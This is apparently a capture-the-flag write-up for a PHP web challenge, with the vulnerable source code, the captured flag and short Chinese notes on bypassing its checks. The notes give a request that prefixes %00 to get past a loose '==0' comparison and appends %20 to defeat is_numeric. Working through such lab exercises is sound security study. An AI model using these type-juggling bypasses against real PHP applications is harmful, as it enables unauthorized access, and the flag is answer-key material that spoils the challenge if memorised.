```php
<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a==0 and $a){
    echo $flag1;
}
if(is_numeric($b)){
    exit();
}
if($b>1234){
    echo $flag2;
}
?>
Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}
```

if($a==0 and $a) 绕过 前面加%00  
is_numeric 绕过，在数字后面加%20  

http://111.200.241.244:50850/?a=%000&b=2234%20